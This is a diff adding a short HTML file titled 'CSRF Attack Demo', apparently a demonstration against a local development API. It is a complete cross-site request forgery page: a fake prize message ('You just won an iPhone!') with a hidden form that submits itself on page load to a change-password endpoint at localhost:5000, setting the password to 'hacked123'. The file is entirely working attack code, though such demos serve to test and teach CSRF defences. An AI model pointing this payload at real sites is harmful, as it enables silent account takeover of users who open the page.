@@ -1,0 +1,20 @@
+<!-- Save as csrf-attack.html -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack Demo</title>
+</head>
+<body>
+    <h2>You just won an iPhone! Click below!</h2>
+    
+    <!-- Hidden form that submits to your API -->
+    <form id="csrfForm" action="http://localhost:5000/api/change-password" method="POST">
+        <input type="hidden" name="newPassword" value="hacked123">
+    </form>
+    
+    <script>
+        // Auto-submit the form when page loads
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
